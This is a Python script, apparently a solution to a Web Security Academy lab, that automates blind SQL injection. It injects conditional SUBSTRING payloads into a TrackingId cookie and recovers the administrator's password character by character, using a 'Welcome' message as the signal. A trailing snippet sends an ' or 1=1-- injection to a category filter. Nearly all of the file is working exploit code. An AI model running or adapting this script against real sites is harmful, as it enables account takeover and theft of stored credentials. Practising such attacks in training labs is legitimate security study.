import requests
import string
from urllib.parse import urlparse

def get_initial_cookies(base_url):
    """Visit the homepage and extract TrackingId + session cookies."""
    try:
        resp = requests.get(base_url, timeout=10)
        cookies = resp.cookies
        tracking_id = cookies.get('TrackingId')
        session_id = cookies.get('session')
        if not tracking_id or not session_id:
            raise ValueError("Failed to retrieve TrackingId or session cookie.")
        print(f"[+] Retrieved cookies: TrackingId={tracking_id}, session={session_id}")
        return tracking_id, session_id
    except Exception as e:
        print(f"[!] Failed to get initial cookies: {e}")
        exit(1)

def main():
    # Step 1: Get URL from user
    raw_url = input("Enter the lab URL (e.g., https://xxx.web-security-academy.net/): ").strip()
    if not raw_url.startswith(('http://', 'https://')):
        raw_url = 'https://' + raw_url

    # Ensure URL ends with '/'
    if not raw_url.endswith('/'):
        raw_url += '/'

    # Step 2: Fetch real cookies
    _, session_cookie = get_initial_cookies(raw_url)

    # Step 3: Prepare extraction
    charset = string.ascii_lowercase + string.digits
    password = ""

    print("\n[+] Starting blind SQL injection...\n")

    # Step 4: Extract password char by char
    for pos in range(1, 21):
        print(f"[+] Trying position {pos}...")
        found = False
        for char in charset:
            # Craft payload (prefix doesn't matter; we override TrackingId entirely)
            payload = f"abc' AND (SELECT SUBSTRING(password,{pos},1) FROM users WHERE username='administrator')='{char}'--"

            cookies = {
                "TrackingId": payload,
                "session": session_cookie
            }

            try:
                resp = requests.get(raw_url, cookies=cookies, timeout=10)
            except Exception as e:
                print(f"[!] Request error at pos {pos}, char '{char}': {e}")
                continue

            if "Welcome" in resp.text:
                password += char
                print(f"[✓] Position {pos}: '{char}' → '{password}'")
                found = True
                break

        if not found:
            print(f"[!] Could not determine character at position {pos}. Appending '?'")
            password += "?"

    print(f"\n[🎉] Final password: {password}")

if __name__ == "__main__":
    main()

response = requests.get(
    'https://0a4b003103334dd7804dd0ab00ea0017.web-security-academy.net//filter?category=Lifestyle%27%20or%201=1--',
)

print(response.text)  # Shows the page's HTML source
